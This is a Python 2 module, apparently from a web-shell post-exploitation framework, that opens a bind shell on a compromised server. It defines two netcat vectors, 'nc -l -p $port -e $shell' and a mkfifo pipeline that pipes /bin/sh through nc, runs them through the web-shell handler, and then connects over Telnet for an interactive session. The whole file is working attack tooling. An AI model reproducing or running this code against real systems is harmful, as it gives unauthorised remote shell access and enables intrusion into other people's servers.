from core.moduleprobeall import ModuleProbeAll
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from urlparse import urlparse
from socket import error
from telnetlib import Telnet
from time import sleep
        

class Tcp(ModuleProbeAll):
    '''Open a shell on TCP port'''


        
    def _init_vectors(self):

        self.vectors = VectorList([
                Vector('shell.sh', 'netcat-traditional', """nc -l -p $port -e $shell"""),
                Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
            ])


    def _init_args(self):
        self.argparser.add_argument('port', help='Port to open', type=int)
        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')

    def _prepare_probe(self):
        self._result = ''
        
    def _execute_vector(self):
        self.current_vector.execute_background(self.modhandler, { 'port': self.args['port'], 'shell' : self.args['shell'] })
        sleep(1)
        
    
    def _verify_execution(self):
        
        if not self.args['no_connect']:
            
            urlparsed = urlparse(self.modhandler.url)
            if urlparsed.hostname:
                try:
                    Telnet(urlparsed.hostname, self.args['port']).interact()
                except error, e:
                    self._result += '%s: %s\n' % (self.current_vector.name, str(e))  
                    raise ExecutionException(self.name, str(e))